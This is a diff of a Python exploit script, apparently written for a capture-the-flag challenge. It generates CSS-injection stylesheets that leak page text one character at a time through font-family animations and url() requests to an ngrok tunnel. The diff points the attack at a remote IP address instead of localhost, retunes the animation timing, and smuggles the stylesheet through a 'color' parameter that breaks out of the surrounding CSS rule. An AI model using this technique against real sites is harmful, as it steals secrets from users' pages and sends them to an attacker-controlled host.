@@ -19,8 +19,8 @@ import sys
 FLAG = ''
 FONT = 'Liberation Mono'
 #TARGET_URL = 'http://3.110.153.60:80'
-#TARGET_URL = 'http://139.59.46.128:8000'
-TARGET_URL = 'http://127.0.0.1:8000'
+TARGET_URL = 'http://139.59.46.128:8000'
+#TARGET_URL = 'http://127.0.0.1:8000'
 #TARGET_URL = 'http://c182-2409-4071-4e98-fbc9-6770-5f9-52fd-3c5f.ngrok.io'
 PORT = 8888
 if len(sys.argv)>1:
@@ -80,7 +80,7 @@ def create_animation(n,w,families,url):
     frame_inner = "{x}% {{ {content} }}"
     frames_inner = ''
     reset_f = "font-family: rest;"
-    set_f = "font-family: {family}, rest; --leak: url({url}?{letter});"
+    set_f = "font-family: {family}, rest; --leak: url({url}/{letter}?{letter});"
 
     i = 0
     num = 0
@@ -161,13 +161,15 @@ def create_leak_style2(selector,h,num,n):
     main = "{selector} {{ overflow-y: auto; overflow-x: hidden; font-size: 0px; height: {h}px; width: 0px; {animation} font-family: rest; word-break: break-all; }}"
     animation = 'animation: '
     n_og = n
-    n = 5
+    n = 3
+    k=0
     for j in range(0,n_og+2):
-        if animation != 'animation: ':
-            animation+=','
-        animation+='loop{j} step-end {n}s {n2}s'.format(j=j,n=n,n2=n*j)
         for i in range(0,num):
-            animation+=', trychar{i} step-end 2s {n2}s 1'.format(i=i,n=n,n2=n*j+i*(n//2)+0.5)
+            if animation != 'animation: ':
+                animation+=','
+            animation+='loop{j} step-end {n}s {n2}s 1'.format(j=j,n=n,n2=k)
+            animation+=', trychar{i} step-end {n}s {n2}s 1'.format(i=i,n=n,n2=k)
+            k=k+n
     animation+=';'
     leak = scrollbar.format(selector=selector)+'\n'+leak.format(selector=selector)+'\n'+main.format(selector=selector,h=h,animation=animation)
     return leak
@@ -195,7 +197,7 @@ def create_stylesheet(n,selector,url):
 def send_stylesheet():
     http_tunnel = ngrok.connect(PORT)
     s=create_stylesheet(10,'div',http_tunnel.public_url)
-    #open('test.html','w').write(f"<style>{s}</style><div>fv{{03Ya}}</div>")
+    open('test.html','w').write(f"<style>{s}</style><div>fv{{03Ya}}</div>")
     color = quote_plus(quote("blue;}\n" + s + "\nbody{color:white"))
     #res = requests.get(f"{TARGET_URL}/?sentence=Yab&color={color}")
     color = quote_plus(f"?color={color}")
